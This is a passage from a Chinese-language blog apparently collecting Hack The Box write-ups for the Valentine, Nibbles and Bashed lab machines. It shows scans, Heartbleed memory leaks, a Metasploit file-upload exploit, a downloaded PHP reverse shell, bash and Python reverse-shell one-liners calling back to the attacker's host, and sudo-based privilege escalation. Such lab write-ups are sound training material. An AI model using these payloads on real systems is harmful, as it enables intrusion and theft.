encryption keys themselves. | | References: | http://www.openssl.org/news/secadv_20140407.txt | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 |_ http://cvedetails.com/cve/2014-0160/ Nmap done: 1 IP address (1 host up) scanned in 54.59 seconds 确实存在心脏滴血，那就去利用一下吧 ┌──(root💀kali)-[~/Desktop] └─# searchsploit heartbleed ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- OpenSSL 1.0.1f TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure (Multiple SSL/TLS Versions) | multiple/remote/32764.py OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (1) | multiple/remote/32791.c OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (2) (DTLS Support) | multiple/remote/32998.c OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure | multiple/remote/32745.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Paper Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- HeartBleed Attack - Paper | docs/english/49313-heartbleed-at ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- ┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine] └─# python exploit.py 10.10.10.79 1 ⨯ Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0302, length = 66 ... received message: type = 22, ver = 0302, length = 885 ... received message: type = 22, ver = 0302, length = 331 ... received message: type = 22, ver = 0302, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0302, length = 16384 Received heartbeat response: 0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....&quot;. 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5. 0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 ................ 0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 ............3.2. 0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 ....E.D...../... 0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 A............... 0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01 ................ 0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00 ..I...........4. 00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00 2............... 00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 ................ 00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00 ................ 00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E ....#.......0.0. 00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F 1/decode.php..Co 00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C ntent-Type: appl 0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F ication/x-www-fo 0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C 0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc 0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld 0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D AA mV0aGVoeXBlCg==. 0160: 3E 27 75 BB 3A EF D9 09 57 8D 5F D1 F7 08 99 48 &gt;&#39;u.:...W._....H 0170: 7F 80 41 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C ..A............. 这里出来了一串密文 aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== 然后使用之前我们找到的 &#x2F;decode 来进行解密 Your input: aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== Your encoded input: heartbleedbelievethehype 得到了一个密码，再去登录试试 别忘了加上权限 chmod 600 id_rsa ┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine] └─# ssh hype@10.10.10.79 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) * Documentation: https://help.ubuntu.com/ New release &#39;14.04.5 LTS&#39; available. Run &#39;do-release-upgrade&#39; to upgrade to it. Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3 hype@Valentine:~$ whoami&amp;&amp;id hype uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare) 登录成功 hype@Valentine:~/Desktop$ cat user.txt e6710a5464769fd5fcd216e076961750 成功拿到 user 权限的 flag 文件 权限提升Step 1hype@Valentine:~/Desktop$ uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux 我们可以看到这台机器版本很老，那肯定是存在脏牛的，在测试中也确实可以使用脏牛直接提权，大家可以自己测试一下 Step 2hype@Valentine:~/Desktop$ history 1 exit 2 exot 3 exit 4 ls -la 5 cd / 6 ls -la 7 cd .devs 8 ls -la 9 tmux -L dev_sess 10 tmux a -t dev_sess 11 tmux --help 12 tmux -S /.devs/dev_sess 13 exit 查看历史命令，看到存在一个文件 &#x2F;.devs&#x2F;dev_sess 去查看一下 hype@Valentine:~/Desktop$ cd /.devs/ hype@Valentine:/.devs$ ls -la total 8 drwxr-xr-x 2 root hype 4096 Apr 11 00:00 . drwxr-xr-x 26 root root 4096 Feb 6 2018 .. srw-rw---- 1 root hype 0 Apr 11 00:00 dev_sess hype@Valentine:/.devs$ cat dev_sess cat: dev_sess: No such device or address 我们是无权限查看这个文件的，但是我们可以分析一下 首先第 9 行使用 -L 运行了，然后第 10 行使用 a -t 运行了，然后第 11 行还查看了帮助，接着在第 12 行使用 -S 运行后，再运行了一个 exit ，那是不是意味着 -S 成功了呢？我们也去尝试一下 root@Valentine:/# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 root@Valentine:~# cat root.txt f1bb6d759df1f272914ebbc9ed7765b2 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Nibbles - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Nibbles","date":"2022-04-09T11:38:36.000Z","updated":"2023-06-13T03:47:30.000Z","comments":true,"path":"2022/04/09/Hackthebox/Easy/Hackthebox-Nibbles/","link":"","permalink":"http://www.lucifiel.com/2022/04/09/Hackthebox/Easy/Hackthebox-Nibbles/","excerpt":"","text":"Hackthebox - Nibbles靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[/home/lucifiel] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-08 11:19 CST Nmap scan report for 10.10.10.75 Host is up (0.14s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/8%OT=22%CT=1%CU=33159%PV=Y%DS=2%DC=T%G=Y%TM=624FA9D0 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 139.27 ms 10.10.14.1 2 139.49 ms 10.10.10.75 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds Http 这台的 http 服务就这么点东西，也没什么用啊，根据靶机名字 字节 ，去看一下源码吧 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Nibbles] └─# curl http://10.10.10.75/ &lt;b&gt;Hello world!&lt;/b&gt; &lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt; 这边可以看到，挂载了一个 &#x2F;nibbleblog&#x2F; 目录 这才是真实的主页 可以看到是 Nibbleblog 搭建的，但是首页没什么东西，去fuzz一下 Fuzz┌──(root💀lucifiel)-[/home/lucifiel] └─# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.75/nibbleblog/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/08 12:58:31 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 321] [--&gt; http://10.10.10.75/nibbleblog/admin/] /plugins (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/plugins/] /themes (Status: 301) [Size: 322] [--&gt; http://10.10.10.75/nibbleblog/themes/] /README (Status: 200) [Size: 4628] /languages (Status: 301) [Size: 325] [--&gt; http://10.10.10.75/nibbleblog/languages/] /content (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/content/] =============================================================== 2022/04/08 13:02:12 Finished =============================================================== 这里可以看到有一个 README 文件 通过 README 文件，首先我们知道了nibbleblog 使用的版本为 4.0.3 ┌──(root💀lucifiel)-[/home/lucifiel] └─# curl http://10.10.10.75/nibbleblog/content/private/users.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; &lt;users&gt;&lt;user username=&quot;admin&quot;&gt;&lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt;&lt;session_fail_count type=&quot;integer&quot;&gt;0&lt;/session_fail_count&gt;&lt;session_date type=&quot;integer&quot;&gt;1514544131&lt;/session_date&gt;&lt;/user&gt;&lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt;&lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt;&lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt;&lt;/blacklist&gt;&lt;/users&gt; &lt;users&gt; &lt;user username=&quot;admin&quot;&gt; &lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt; &lt;session_fail_count type=&quot;integer&quot;&gt;0&lt;/session_fail_count&gt; &lt;session_date type=&quot;integer&quot;&gt;1514544131&lt;/session_date&gt; &lt;/user&gt; &lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt; &lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt; &lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt; &lt;/blacklist&gt; &lt;/users&gt; 我们在 users.xml 中知道了管理员的用户名和 IP 地址 http://10.10.10.75/nibbleblog/admin.php 并且找到了一个登录点，但是我们没有密码，Nibbleblog 也没有默认密码，我们去尝试一下登录 最后测试弱口令成功登录 username = admin password = nibbles 我们去搜索一下漏洞 Searchsploit┌──(root💀kali)-[~/Desktop/HTB/Easy/Nibbles] └─# searchsploit Nibbleblog 4.0.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results 知道了 msf 有一个任意文件上传的漏洞 漏洞利用msf6 exploit(multi/http/nibbleblog_file_upload) &gt; show options Module options (exploit/multi/http/nibbleblog_file_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD nibbles yes The password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.75 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /nibbleblog/ yes The base path to the web application USERNAME admin yes The username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.9 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Nibbleblog 4.0.3 设置好相关的参数，然后 exploit 执行 msf6 exploit(multi/http/nibbleblog_file_upload) &gt; exploit [*] Started reverse TCP handler on 10.10.14.9:4444 [*] Sending stage (39282 bytes) to 10.10.10.75 [+] Deleted image.php [*] Meterpreter session 1 opened (10.10.14.9:4444 -&gt; 10.10.10.75:41138) at 2022-04-08 13:24:32 +0800 meterpreter &gt; getuid Server username: nibbler (1001) 成功拿到一个 shell shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; 按照这些流程获取一个交互式 shell nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt e8c44981255d5ccfaba9f1e2c343b6a1 成功获得 user 权限的 flag 文件 权限提升nibbler@Nibbles:/home/nibbler$ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh 使用 sudo -l 发现一个 sh 脚本可以用 root 权限执行 nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory 查看显示没有这个文件，去浏览一下 nibbler@Nibbles:/home/nibbler$ ls -la total 20 drwxr-xr-x 3 nibbler nibbler 4096 Dec 29 2017 . drwxr-xr-x 3 root root 4096 Dec 10 2017 .. -rw------- 1 nibbler nibbler 0 Dec 29 2017 .bash_history drwxrwxr-x 2 nibbler nibbler 4096 Dec 10 2017 .nano -r-------- 1 nibbler nibbler 1855 Dec 10 2017 personal.zip -r-------- 1 nibbler nibbler 33 Apr 8 01:20 user.txt 是一个压缩包，去自己解压出来 nibbler@Nibbles:/home/nibbler$ unzip personal.zip Archive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh 然后再去查看一下 nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh #################################################################################################### # Tecmint_monitor.sh # # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/ # # If any bug, report us in the link below # # Free to use/edit/distribute the code below by # # giving proper credit to Tecmint.com and Author # # # #################################################################################################### #! /bin/bash # unset any variable which system may be using # clear the screen clear unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage while getopts iv name do case $name in i)iopt=1;; v)vopt=1;; *)echo &quot;Invalid arg&quot;;; esac done if [[ ! -z $iopt ]] then { wd=$(pwd) basename &quot;$(test -L &quot;$0&quot; &amp;&amp; readlink &quot;$0&quot; || echo &quot;$0&quot;)&quot; &gt; /tmp/scriptname scriptname=$(echo -e -n $wd/ &amp;&amp; cat /tmp/scriptname) su -c &quot;cp $scriptname /usr/bin/monitor&quot; root &amp;&amp; echo &quot;Congratulations! Script Installed, now run monitor Command&quot; || echo &quot;Installation failed&quot; } fi if [[ ! -z $vopt ]] then { echo -e &quot;tecmint_monitor version 0.1\\nDesigned by Tecmint.com\\nReleased Under Apache 2.0 License&quot; } fi if [[ $# -eq 0 ]] then { # Define Variable tecreset tecreset=$(tput sgr0) # Check if connected to Internet or not ping -c 1 google.com &amp;&gt; /dev/null &amp;&amp; echo -e &#39;\\E[32m&#39;&quot;Internet: $tecreset Connected&quot; || echo -e &#39;\\E[32m&#39;&quot;Internet: $tecreset Disconnected&quot; # Check OS Type os=$(uname -o) echo -e &#39;\\E[32m&#39;&quot;Operating System Type :&quot; $tecreset $os # Check OS Release Version and Name cat /etc/os-release | grep &#39;NAME\\|VERSION&#39; | grep -v &#39;VERSION_ID&#39; | grep -v &#39;PRETTY_NAME&#39; &gt; /tmp/osrelease echo -n -e &#39;\\E[32m&#39;&quot;OS Name :&quot; $tecreset &amp;&amp; cat /tmp/osrelease | grep -v &quot;VERSION&quot; | cut -f2 -d\\&quot; echo -n -e &#39;\\E[32m&#39;&quot;OS Version :&quot; $tecreset &amp;&amp; cat /tmp/osrelease | grep -v &quot;NAME&quot; | cut -f2 -d\\&quot; # Check Architecture architecture=$(uname -m) echo -e &#39;\\E[32m&#39;&quot;Architecture :&quot; $tecreset $architecture # Check Kernel Release kernelrelease=$(uname -r) echo -e &#39;\\E[32m&#39;&quot;Kernel Release :&quot; $tecreset $kernelrelease # Check hostname echo -e &#39;\\E[32m&#39;&quot;Hostname :&quot; $tecreset $HOSTNAME # Check Internal IP internalip=$(hostname -I) echo -e &#39;\\E[32m&#39;&quot;Internal IP :&quot; $tecreset $internalip # Check External IP externalip=$(curl -s ipecho.net/plain;echo) echo -e &#39;\\E[32m&#39;&quot;External IP : $tecreset &quot;$externalip # Check DNS nameservers=$(cat /etc/resolv.conf | sed &#39;1 d&#39; | awk &#39;{print $2}&#39;) echo -e &#39;\\E[32m&#39;&quot;Name Servers :&quot; $tecreset $nameservers # Check Logged In Users who&gt;/tmp/who echo -e &#39;\\E[32m&#39;&quot;Logged In users :&quot; $tecreset &amp;&amp; cat /tmp/who # Check RAM and SWAP Usages free -h | grep -v + &gt; /tmp/ramcache echo -e &#39;\\E[32m&#39;&quot;Ram Usages :&quot; $tecreset cat /tmp/ramcache | grep -v &quot;Swap&quot; echo -e &#39;\\E[32m&#39;&quot;Swap Usages :&quot; $tecreset cat /tmp/ramcache | grep -v &quot;Mem&quot; # Check Disk Usages df -h| grep &#39;Filesystem\\|/dev/sda*&#39; &gt; /tmp/diskusage echo -e &#39;\\E[32m&#39;&quot;Disk Usages :&quot; $tecreset cat /tmp/diskusage # Check Load Average loadaverage=$(top -n 1 -b | grep &quot;load average:&quot; | awk &#39;{print $10 $11 $12}&#39;) echo -e &#39;\\E[32m&#39;&quot;Load Average :&quot; $tecreset $loadaverage # Check System Uptime tecuptime=$(uptime | awk &#39;{print $3,$4}&#39; | cut -f1 -d,) echo -e &#39;\\E[32m&#39;&quot;System Uptime Days/(HH:MM) :&quot; $tecreset $tecuptime # Unset Variables unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage # Remove Temporary Files rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage } fi shift $(($OPTIND -1)) 我们查看一下这个文件的权限组 nibbler@Nibbles:/home/nibbler$ ls -la /home/nibbler/personal/stuff/monitor.sh -rwxrwxrwx 1 nibbler nibbler 4015 May 8 2015 /home/nibbler/personal/stuff/monitor.sh 777 权限，那就简单了，写入一段查看 flag 的语句然后执行 nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &#39;cat /root/root.txt&#39; &gt; monitor.sh nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh 48716e5e4fa73411376fb8ee5f037bed 成功拿到 root 权限的 flag 文件 如果我们向拿到 root 权限的 shell，那就去写入一个反弹语句 使用 nc 监听一个端口 nc -nvlp 5555 echo &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/5555 0&gt;&amp;1&quot;&#39; &gt; monitor.sh 写入语句后执行 sudo ./ monitor.sh root@Nibbles:/home/nibbler/personal/stuff# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功拿到 root 权限","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bashed - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Bashed","date":"2022-04-08T11:38:36.000Z","updated":"2023-06-13T03:40:36.000Z","comments":true,"path":"2022/04/08/Hackthebox/Easy/Hackthebox-Bashed/","link":"","permalink":"http://www.lucifiel.com/2022/04/08/Hackthebox/Easy/Hackthebox-Bashed/","excerpt":"","text":"Hackthebox - Bashed靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Bashed] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.68 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 20:51 EDT Nmap scan report for 10.10.10.68 Host is up (0.27s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel&#39;s Development Site No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/7%OT=80%CT=1%CU=37395%PV=Y%DS=2%DC=T%G=Y%TM=624F8737 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=RD%II=I%TS=A)SEQ OS:(SP=F8%GCD=1%ISR=104%TI=Z%TS=A)SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=B)S OS:EQ(SP=F9%GCD=1%ISR=103%TI=Z%CI=RD%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7 OS:%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W OS:2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NN OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40 OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 229.69 ms 10.10.14.1 2 229.83 ms 10.10.10.68 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.00 seconds Http 看着似乎像是一个博客，去随便看看 这里提示使用了 Arrexel 的 phpbash，然后给了一个地址 &#x2F;uploads&#x2F;phpbash.php 但是访问后不存在，去做个 fuzz 吧 Fuzzgobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.68 [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/08 09:01:23 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 311] [--&gt; http://10.10.10.68/images/] /php (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--&gt; http://10.10.10.68/js/] /fonts (Status: 301) [Size: 310] [--&gt; http://10.10.10.68/fonts/] /server-status (Status: 403) [Size: 299] =============================================================== 2022/04/08 09:04:55 Finished =============================================================== 在 dev 下找到了我们要的东西 漏洞利用 确认可以执行命令，那就来反弹一个 bashshell 吧 使用 nc 监听一个端口 nc -nlvp 4444 然后下载一个 反向的 phpshell https://raw.githubusercontent.com/LucifielHack/TTY-Reverse-Shell-PHP/master/revshell.php 然后使用 python3 开启一个 http 服务器 python3 -m http.server 80 然后在 phpbash 里使用 wget 进行下载 www-data@bashed:/var/www/html/uploads# wget http://10.10.14.9/revshell.php --2022-04-07 19:03:56-- http://10.10.14.9/revshell.php Connecting to 10.10.14.9:80... connected. HTTP request sent, awaiting response... 200 OK Length: 4479 (4.4K) [application/octet-stream] Saving to: &#39;revshell.php&#39; 0K .... 100% 443M=0s 2022-04-07 19:03:56 (443 MB/s) - &#39;revshell.php&#39; saved [4479/4479] 接着访问一下 revshell.php（需要在 uploads 目录下，否则没写入权限） curl http://10.10.10.68/uploads/revshell.php $ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获得一个 shell $ cat /home/arrexel/user.txt 2c281f318555dbc1b856957c7147bfc1 成功获得 user 权限的 flag 文件 权限提升$ sudo -l Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL 使用 sudo -l 查看权限后，发现可以使用 scriptmanager 用户的权限指令任何命令 python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Ctrl+Z返回 stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 首先获得一个交互式 bash，并且修复一下 sudo -u scriptmanager bash 然后使用 sudo -u 来使用 scriptmanager 用户执行 bash 指令 scriptmanager@bashed:/$ whoami whoami scriptmanager 成功进入 scriptmanager 的 bash scriptmanager@bashed:/$ ls ls bin etc lib media proc sbin sys var boot home lib64 mnt root scripts tmp vmlinuz dev initrd.img lost+found opt run srv usr 这里发现根目录下有一个不正常的 scripts 目录，进去查看一下 scriptmanager@bashed:/scripts$ ls -la ls -la total 16 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 . drwxr-xr-x 23 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py -rw-r--r-- 1 root root 12 Apr 7 19:21 test.txt 这里有两个文件，一个 test.py 我们可以运行，一个 test.txt 是 root 账户的文件，并且 test.txt 似乎最近刚被修改过 scriptmanager@bashed:/scripts$ cat test.txt cat test.txt testing 123! 似乎没什么内容 scriptmanager@bashed:/scripts$ cat test.py cat test.py f = open(&quot;test.txt&quot;, &quot;w&quot;) f.write(&quot;testing 123!&quot;) f.close 这个脚本会向 test.txt 写入内容，那就好办了，篡改一下内容 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.9&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); 然后使用 nc 监听一个端口 nc -nvlp 5555 接着等待一会儿 ┌──(root💀lucifiel)-[/home/lucifiel/Desktop] └─# nc -nvlp 5555 130 ⨯ listening on [any] 5555 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 35106 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功拿到 root 权限 # cat /root/root.txt cc4f0afe3a1026d402ba10329674a8e2 成功拿到 root 权限的 flag 